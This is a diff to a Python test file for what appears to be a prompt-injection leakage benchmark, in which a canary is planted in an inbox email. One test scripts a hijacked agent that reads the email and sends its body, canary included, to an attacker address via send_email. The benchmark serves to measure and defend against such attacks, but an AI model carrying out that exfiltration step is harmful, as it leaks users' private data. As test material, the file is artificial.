@@ -7,10 +7,12 @@ and destination the scorer needs.
 
 from __future__ import annotations
 
-from leakgauge.cases import BENIGN_ACTION, DELAYED_CANARY, DELAYED_CASE, build_environment
+from leakgauge.cases import BENIGN_ACTION, DELAYED_CASE, ONPATH_EMAIL_ID, build_environment
 from leakgauge.types import Environment, ToolCall
 
 _ACT = BENIGN_ACTION[DELAYED_CASE.id]
+_CANARY = DELAYED_CASE.canary
+_ONPATH = ONPATH_EMAIL_ID[DELAYED_CASE.id]
 
 
 def test_environment_satisfies_protocol() -> None:
@@ -38,8 +40,8 @@ def test_tools_and_specs_present() -> None:
         "read_event",
     }
     # canary is planted inside an env field, never in the user task
-    assert DELAYED_CANARY not in DELAYED_CASE.user_task
-    assert any(DELAYED_CANARY in e["body"] for e in env.snapshot()["inbox"])
+    assert _CANARY not in DELAYED_CASE.user_task
+    assert any(_CANARY in e["body"] for e in env.snapshot()["inbox"])
 
 
 def test_tools_mutate_and_append_trace() -> None:
@@ -55,7 +57,7 @@ def test_benign_agent_completes_utility_no_leak() -> None:
     """Agent reads the on-path email for the date, schedules, ignores the lure."""
     env = build_environment(DELAYED_CASE)
     env.call("read_inbox", {})
-    env.call("read_email", {"email_id": "appt-confirm"})
+    env.call("read_email", {"email_id": _ONPATH})
     env.call("create_event", {"title": _ACT["title"], "start": _ACT["start"], "end": _ACT["end"]})
 
     assert env.utility_ok(DELAYED_CASE.utility_key) is True
@@ -69,14 +71,14 @@ def test_hijacked_leaking_agent_one_hop() -> None:
     a hijacked agent needs no extra retrieval to leak it."""
     env = build_environment(DELAYED_CASE)
     env.call("read_inbox", {})
-    creds = env.call("read_email", {"email_id": "appt-confirm"})  # date AND canary here
+    creds = env.call("read_email", {"email_id": _ONPATH})  # date AND canary here
     attacker = DELAYED_CASE.exfil_spec.attacker_addresses[0]
     env.call("send_email", {"recipients": [attacker], "subject": "confirm", "body": creds["body"]})
 
     exfil = [c for c in env.trace if c.tool == "send_email" and attacker in _dest(c)]
     assert len(exfil) == 1
-    assert DELAYED_CANARY in exfil[0].args["body"]  # leak
-    assert DELAYED_CANARY in creds["body"]  # co-located with the on-path detail
+    assert _CANARY in exfil[0].args["body"]  # leak
+    assert _CANARY in creds["body"]  # co-located with the on-path detail
 
 
 def test_hijacked_without_leak_is_the_discriminating_cell() -> None:
@@ -87,4 +89,4 @@ def test_hijacked_without_leak_is_the_discriminating_cell() -> None:
 
     exfil = [c for c in env.trace if c.tool == "send_email" and attacker in _dest(c)]
     assert len(exfil) == 1  # hijack: True
-    assert DELAYED_CANARY not in exfil[0].args["body"]  # leakage: False
+    assert _CANARY not in exfil[0].args["body"]  # leakage: False
